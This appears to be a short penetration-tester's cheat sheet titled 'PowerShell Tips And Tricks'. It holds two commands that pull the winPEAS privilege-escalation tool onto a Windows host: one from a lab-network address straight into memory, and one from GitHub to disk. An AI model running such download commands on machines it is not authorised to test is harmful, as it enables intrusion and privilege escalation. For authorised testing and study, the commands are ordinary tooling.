# PowerShell Tips And Tricks

```
$data=(New-Object System.Net.WebClient).DownloadData('http://192.168.56.1:8080/winPEASany_ofs.exe');

iwr "https://github.com/carlospolop/PEASS-ng/releases/download/20240204-ab87b191/winPEASx64_ofs.exe" -OutFile winpeas.exe
```